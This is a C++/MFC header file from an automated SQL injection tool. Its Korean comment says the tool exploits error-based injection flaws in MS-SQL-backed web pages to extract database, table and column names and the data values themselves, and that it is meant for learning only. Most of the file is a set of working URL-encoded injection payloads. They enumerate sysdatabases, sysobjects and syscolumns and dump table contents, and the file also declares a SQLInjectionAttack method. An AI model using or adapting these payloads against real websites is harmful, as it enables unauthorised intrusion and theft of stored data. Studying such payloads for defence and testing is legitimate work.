/*
  본 프로그램은 MS-SQL서버 연동하는 웹 페이지에 에러 메시지 기반
  SQL 인젝션 취약점이 존재할 경우에 해당 DBMS 정보(DB명,테이블명,
  필드명, 데이터 값)를 뽑아(select)내는 점검 프로그램입니다.

  이 프로그램을 구현하기 위해서 짧은 시간에 MFC를 학습하였기에 코
  드 완성도가 많이 떨어지고 C++ 스타일 답지 않을 수 있습니다.

  해당 소스는 누구나 자유롭게 배포할 수 있으며, 수정도 가능합니다.
  
  단, 악용하였을 경우에는 해킹 프로그램을 오용될 수 있기 때문에 학습
  용도로만 사용해야 합니다.

  악용하였을 경우에는 본인이 책임을 져야 합니다.

  작성자 : 김태훈(franc3sco@paran.com)

*/
#ifndef __MSSQLCODE_H__
#define __MSSQLCODE_H__

#pragma once
#include "ProcessControl.h"
#include "SITEDoc.h"
#include "RightGroupView.h"
#include "SITEHeader.h"
#include "LogDataView.h"

// CMssqlCode
//#define	MSSQL_INJCODE_CURRENTDBUSER		"%20and%20(char(94)%2Buser%2Bchar(94))>0"
#define	MSSQL_INJCODE_NUMOFDATABSE		"%%20or%%20(select%%20char(94)%%2Bcast(count(1)%%20as%%20varchar(80))%%2Bchar(94)%%20from%%20[master]..[sysdatabases]%%20)=0--"
#define	MSSQL_INJCODE_ALLDATABASE		"%%20or%%20(select%%20cast(char(94)%%2Bname%%2Bchar(94)%%20as%%20varchar(8000))%%20from%%20[master]..[sysdatabases]%%20where%%20dbid=%d)>0%%20--"

#define	MSSQL_INJCODE_CURRENTDATABASE	"%20or%201=(char(94)%2Bdb_name()%2Bchar(94))--"

#define	MSSQL_INJCODE_NUMOFTABLES		"%%20or%%20(select%%20char(94)%%2Bcast(count(1)%%20as%%20varchar(80))%%2Bchar(94)%%20from%%20[%s]..[sysobjects]%%20where%%20xtype=char(85))=0--"
#define	MSSQL_INJCODE_TABLENAME			"%%20or%%20(Select%%20Top%%201%%20cast(char(94)%%2Bname%%2Bchar(94)%%20as%%20varchar(8000))%%20from(Select%%20Top%%20%d%%20id,name%%20from%%20[%s]..[sysobjects]%%20Where%%20xtype=char(85)%%20order%%20by%%20name%%20asc,id%%20desc)%%20T%%20order%%20by%%20name%%20desc,id%%20asc)>0%%20--"

#define	MSSQL_INJCODE_NUMOFFIELD		"%%20or%%20(select%%20char(94)%%2Bcast(count(1)%%20as%%20varchar(80))%%2Bchar(94)%%20from%%20[%s]..[syscolumns]%%20A,[%s]..[sysobjects]%%20B%%20where%%20A.id=B.id%%20and%%20B.name='%s')>0%%20--"
#define	MSSQL_INJCODE_FIELDNAME			"%%20or%%20(select%%20Top%%201%%20cast(char(94)%%2Bname%%2Bchar(94)%%20as%%20varchar(80))%%20from(Select%%20Top%%20%d%%20B.name%%20from%%20[%s]..[sysobjects]%%20A%%20,[%s]..[syscolumns]%%20B%%20where%%20A.id=B.id%%20and%%20A.name='%s'%%20order%%20by%%20B.name%%20asc)%%20T%%20order%%20by%%20name%%20desc)>0%%20--"

#define	MSSQL_INJCODE_NUMOFDATA			"%%20or%%20(Select%%20char(94)%%2BCast(Count(1)%%20as%%20varchar(8000))%%2Bchar(94)%%20From%%20[%s]..[%s]%%20Where%%201=1)>0%%20--"
#define	MSSQL_INJCODE_DATAVALUE			"%%20or%%20(select%%20top%%201%%20char(94)%%2Bcast(%s%%20as%%20varchar(8000))%%2Bchar(94)%%20%%20from%%20(%%20select%%20top%%20%d%%20%s%%20from%%20[%s]..[%s]%%20order%%20by%%20%s%%20desc%%20)%%20as%%20as_TableName%%20order%%20by%%20%s%%20asc%%20)>0%%20--"


class CSITEDoc;
class CProcessControl;
class CLogDataView;
class CMssqlCode : public CWnd
{
	DECLARE_DYNAMIC(CMssqlCode)

public:
	CMssqlCode();
	virtual ~CMssqlCode();


protected:
	DECLARE_MESSAGE_MAP()

public:
	CDocument* m_pDocument;

public:
	static DWORD m_dwDBcount;
	static DWORD m_dwTBcount;
	static DWORD m_dwFDcount;
	static DWORD m_dwDTcount;
	static char g_szLogBuffer[2048];
	static char g_szLogTime[32];
	CSITEDoc	*GetDocument();
	bool GetCurrentDBnameQuery(CProcessControl *pPCtrl);
	int GetNumOfDBList(CProcessControl* pPCtrl);
	bool GetDBListQuery(CProcessControl * pPCtrl, DWORD category_flag=CATEGORY_COUNT, DWORD count_idx = 1);
	bool GetDBNameQuery(CProcessControl * pPCtrl,  DWORD count_idx) ;
	bool SQLInjectionAttack(CProcessControl *pPCtrl, DWORD category_flag=CATEGORY_COUNT, DWORD count_idx = 1);
	bool ReadResultStream(CProcessControl *pPCtrl, char * pszResult, DWORD size);
	bool CMssqlCode::SendItemToTreeView(char *pszItem, DWORD category_type);
	bool GetTableListQuery(CProcessControl *pPCtrl, DWORD category_flag=CATEGORY_COUNT, DWORD count_idx = 1);
	int  GetNumOfTableList(CProcessControl *pPCtrl);
	bool GetTableNameQuery(CProcessControl *pPCtrl, DWORD count_idx);	
	bool GetFieldListQuery(CProcessControl *pPCtrl, DWORD category_flag=CATEGORY_COUNT, DWORD count_idx = 1);
	int GetNumOfFieldList(CProcessControl *pPCtrl);
	bool GetFieldNameQuery(CProcessControl *pPCtrl, DWORD count_idx);
	int GetNumOfDataList(CProcessControl * pPCtrl);
	bool GetDataListQuery(CProcessControl * pPCtrl, DWORD category_flag, DWORD count_idx);
	bool GetDataValueQuery(CProcessControl* pPCtrl, DWORD count_idx);
	bool CMssqlCode::SendLogDataToListView(CProcessControl *pPCtrl, CString objURI, CString objPostParameter="");
	


public:
	bool AddHttpRequestHeader(void);
};

#endif

